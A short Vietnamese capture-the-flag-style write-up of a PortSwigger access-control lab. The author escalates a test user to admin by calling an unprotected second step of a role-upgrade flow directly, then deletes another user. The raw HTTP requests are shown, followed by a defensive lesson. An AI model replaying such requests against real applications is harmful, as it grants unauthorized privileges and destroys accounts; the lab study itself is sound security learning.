![[idor-multistep.png]]
-mô tả lab: chức năng upgrade role làm 2 bước, bước 2 (`/admin-roles/upgrade`) không check quyền. Mình gọi thẳng bước 2 là thành admin.

> [!NOTE]
> -Lab: https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step
> -test bằng `wiener:peter`

### hướng giải
- [ ] mình login wiener, vào `/admin` thì bị đá (đúng vì mình chưa phải admin)
- [ ] mình đọc JS/flow upgrade role, mình thấy bước 1 GET `/admin-roles?username=wiener` (bị check), bước 2 POST `/admin-roles/upgrade` với `action=upgrade&confirmed=true&username=wiener`
- [ ] mình thử gọi thẳng bước 2, sau đó quan sát gói tin trả về, mình thấy `302` thành công, không hỏi quyền gì
- [ ] => dev chỉ gắn check ở bước 1 mà quên bước 2. Mình upgrade wiener rồi vào admin xóa carlos là solve

### giải
```
POST /admin-roles/upgrade HTTP/1.1
Cookie: session=SESSION_WIENER
Content-Type: application/x-www-form-urlencoded

action=upgrade&confirmed=true&username=wiener
-> 302, wiener thành admin
GET /admin -> 200 admin panel
GET /admin/delete?username=carlos -> 302
```
![[idor-multistep-upgrade.png]]

> [!NOTE]
> -bài học của mình: multi-step flow thì bước nào cũng phải check quyền độc lập, đừng tin "đi qua bước 1 rồi thì bước 2 chắc hợp lệ".
